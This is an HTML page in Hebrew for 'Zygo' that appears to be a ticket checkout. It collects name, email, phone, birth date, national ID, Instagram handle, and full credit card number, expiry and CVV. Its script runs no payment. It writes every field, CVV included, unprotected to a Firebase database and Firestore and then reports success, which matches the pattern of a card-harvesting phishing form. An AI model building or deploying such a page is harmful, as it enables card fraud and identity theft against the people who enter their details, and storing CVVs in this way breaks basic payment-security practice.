<!doctype html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Zygo</title>

  <style>
    body {
      font-family: Arial;
      direction: rtl;
      background: #f4f4f4;
      margin: 0;
    }
    .screen { display:none; background:#fff; padding:20px; max-width:400px; margin:40px auto; border-radius:10px; }
    .screen.active { display:block; }
    input, select, button { width:100%; padding:10px; margin-bottom:12px; box-sizing:border-box; }
    button { background:black; color:white; border:none; cursor:pointer; }
  </style>
</head>

<body>

<form id="nameForm">

  <!-- SCREEN 1 -->
  <div class="screen active" id="screen1">
    <h2>בחירת כרטיס</h2>
    <button type="button" onclick="nextScreen(1)">המשך</button>
  </div>

  <!-- SCREEN 2 -->
  <div class="screen" id="screen2">
    <h2>פרטים אישיים</h2>

    <input type="text" id="firstName" placeholder="First Name" required>
    <input type="text" id="lastName" placeholder="Last Name" required>
    <input type="email" id="email" placeholder="Email" required>
    <input type="number" id="phoneNumber" placeholder="Phone Number" required>
    <input type="date" id="birthDate" required>

    <select id="gender" required>
      <option value="">Gender</option>
      <option value="male">Male</option>
      <option value="female">Female</option>
      <option value="other">Other</option>
    </select>

    <input type="text" id="instagram" placeholder="Instagram">
    <input type="number" id="ID" placeholder="ID" required>

    <button type="button" onclick="prevScreen(2)">חזור</button>
    <button type="button" onclick="nextScreen(2)">המשך</button>
  </div>

  <!-- SCREEN 3 -->
  <div class="screen" id="screen3">
    <h2>תשלום</h2>

    <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
    <input type="text" id="expire" placeholder="Expire MM/YY" required>
    <input type="number" id="cvv" placeholder="CVV" required>

    <button type="submit">שלם</button>
    <div id="saveStatus" style="margin-top:10px;font-size:13px;"></div>
  </div>

</form>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<script>
  function nextScreen(n){
    document.getElementById("screen"+n).classList.remove("active");
    document.getElementById("screen"+(n+1)).classList.add("active");
  }
  function prevScreen(n){
    document.getElementById("screen"+n).classList.remove("active");
    document.getElementById("screen"+(n-1)).classList.add("active");
  }
</script>

<script>
document.addEventListener("DOMContentLoaded", () => {

  const firebaseConfig = {
    apiKey: "AIzaSyDZVrncvPwEg6IDHjloweJNjrpj32lZy5g",
    authDomain: "zygo-acf32.firebaseapp.com",
    databaseURL: "https://zygo-acf32-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "zygo-acf32",
    storageBucket: "zygo-acf32.firebasestorage.app",
    messagingSenderId: "243652763597",
    appId: "1:243652763597:web:f9cbc63435193855236e84"
  };

  firebase.initializeApp(firebaseConfig);

  const database = firebase.database();
  const firestore = firebase.firestore();

  const form = document.getElementById("nameForm");
  const statusEl = document.getElementById("saveStatus");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const userData = {
      firstName: firstName.value,
      lastName: lastName.value,
      email: email.value,
      phoneNumber: phoneNumber.value,
      birthDate: birthDate.value,
      gender: gender.value,
      instagram: instagram.value,
      ID: ID.value,
      creditCardNumber: creditCardNumber.value,
      expire: expire.value,
      cvv: cvv.value,
      createdAt: Date.now()
    };

    const collectionName = "Details";

    try {
      statusEl.textContent = "שומר נתונים...";

      await database.ref(collectionName).push(userData);
      await firestore.collection(collectionName).add(userData);

      statusEl.textContent = "✅ נשמר בהצלחה";
      alert("הנתונים נשמרו בהצלחה");
      form.reset();

    } catch (err) {
      console.error(err);
      statusEl.textContent = "❌ שגיאה בשמירה";
    }
  });

});
</script>

</body>
</html>
